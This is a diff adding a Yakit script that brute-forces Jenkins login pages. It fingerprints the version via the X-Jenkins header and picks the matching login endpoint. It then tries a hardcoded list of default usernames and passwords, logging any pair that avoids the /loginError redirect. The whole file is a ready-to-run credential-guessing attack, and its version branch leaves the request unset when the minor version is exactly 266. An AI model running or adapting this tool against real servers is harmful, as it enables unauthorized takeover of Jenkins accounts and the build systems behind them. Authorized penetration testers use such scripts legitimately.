@@ -1,0 +1,124 @@
+log.setLevel("info")
+yakit.AutoInitYakit()
+
+target = cli.String("target")
+port = cli.String("port")
+if target == "" || port == ""{
+    yakit.Error("目标或端口不能为空")
+    log.error("目标或端口不能为空")
+    return
+}
+
+userlist = ["admin","root","jenkins","administrator","jenkinsadmin","jenkinsroot"]
+passlist = ["123456","admin","ab7458583cfd4cd1be9cf81e9d7a4244","test","jenkins","admin@123","admin123321"]
+
+
+checkVersion = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    rsp,req,err =  poc.HTTP(`
+GET /login?from=%2F HTTP/1.1
+Host: {{params(addr)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Cookie: screenResolution=1920x972; JSESSIONID.7756247e=node0px81yd6xxvw21q6pp3r1c62vn156.node0
+Referer: http://{{params(addr)}}/
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36`, 
+poc.params({
+        "addr":addr,
+    }),poc.https(isTls),poc.noRedirect(false))
+    if str.MatchAllOfSubString(string(rsp), "X-Jenkins:"){
+        r,err = re.Compile(`X-Jenkins:\s+(.*?)\s+`)
+        versionCode = r.FindAllStringSubmatch(string(rsp),-1)[0][1]
+        
+        return versionCode
+    } else {
+        yakit.Error("响应头不存在X-Jenkins")
+        log.error("响应头不存在X-Jenkins")
+        return
+    }
+}
+
+packet1 = `POST /j_acegi_security_check HTTP/1.1
+Host: {{params(addr)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cache-Control: max-age=0
+Content-Length: 68
+Content-Type: application/x-www-form-urlencoded
+Cookie: screenResolution=1920x972; JSESSIONID.bd153fc1=node0ttpq35l4h0z61eaf8viqoaeto15.node0; JSESSIONID.631fe832=node01h27sfc95amf0er8wziv1iiob15.node0
+DNT: 1
+Origin: http://{{params(addr)}}
+Referer: http://{{params(addr)}}/login?from=/
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+sec-gpc: 1
+
+j_username={{params(username)}}&j_password={{params(password)}}&from=%2F&Submit=%E7%99%BB%E5%BD%95`
+
+packet2 = `POST /j_spring_security_check HTTP/1.1
+Host: {{params(addr)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Length: 77
+Content-Type: application/x-www-form-urlencoded
+Cookie: screenResolution=1920x972; JSESSIONID.7756247e=node013vu5a9qlmfr8ahwn0i0978tw123.node0
+Origin: http://{{params(addr)}}
+Referer: http://{{params(addr)}}/login?from=%2F
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+
+j_username={{params(username)}}&j_password={{params(password)}}&from=%2F&Submit=`
+
+sendPacket = func(target,port,username,password,packet){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    return poc.HTTP(packet, 
+poc.params({
+        "addr":addr,
+        "username":username,
+        "password":password,
+    }),poc.https(isTls),poc.redirectTimes(0))
+
+}
+
+yakit.Info("获取参数")
+log.info("获取参数")
+yakit.SetProgress(0.2)
+versionCode = checkVersion(target,port)
+vc = str.Split(versionCode, ".")[1]
+vci = parseInt(vc)
+if vci > 266{
+    packet = packet2
+}elif vci < 266{
+    packet = packet1
+}
+for _,user = range userlist {
+    for _,pass = range passlist {
+        rsp,req,err = sendPacket(target,port,user,pass,packet)
+        time.sleep(1)
+        if err != nil {
+            yakit.Error("数据包发送失败")
+            log.error("数据包发送失败")
+            // println(err,err1)
+            yakit.SetProgress(1)
+            return
+        }
+        yakit.SetProgress(0.5)
+        // println(string(rsp))
+        if !str.MatchAnyOfSubString(rsp, `/loginError`) {
+            // println(string(body))
+            yakit.Info("Jenkins爆破成功，用户：%v,密码：%v ",user,pass)
+            log.info("Jenkins爆破成功，用户：%v,密码：%v ",user,pass)
+            yakit.SetProgress(1)
+            return     
+        }
+
+    }
+}
